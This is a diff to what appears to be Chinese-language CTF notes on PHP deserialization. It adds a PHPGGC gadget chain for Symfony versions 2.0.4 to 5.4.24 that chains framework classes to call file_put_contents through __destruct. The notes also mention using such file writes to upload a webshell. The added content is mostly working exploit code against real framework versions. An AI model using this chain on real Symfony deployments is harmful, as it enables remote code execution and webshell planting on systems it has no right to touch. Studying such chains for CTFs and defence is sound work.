@@ -34,3 +34,30 @@ class RCE11 extends \PHPGGC\GadgetChain\RCE\FunctionCall
     }
 }
 ```
+
+此外，经高人指点，可以利用如下代码来执行多参数
+```php
+<?php
+
+namespace GadgetChain\Symfony;
+
+class RCE11 extends \PHPGGC\GadgetChain\RCE\FunctionCall
+{
+    public static $version = '2.0.4 <= 5.4.24 (all)';
+    public static $vector = '__destruct';
+    public static $author = 'cfreal';
+
+    public function generate(array $parameters)
+    {
+        $a = new \Symfony\Component\Validator\ConstraintViolationList([
+                '/tmp/11',
+                '11',
+        ]);
+        $b = new \Symfony\Component\Finder\Iterator\SortableIterator($a, 'file_put_contents');
+        $c = new \Symfony\Component\Validator\ConstraintViolationList($b);
+        $d = new \Symfony\Component\Security\Core\Authentication\Token\AnonymousToken($c);
+        return $d;
+    }
+}
+```
+如果题目禁止了写文件，则难以上传webshell，此时第一种方法最好用。
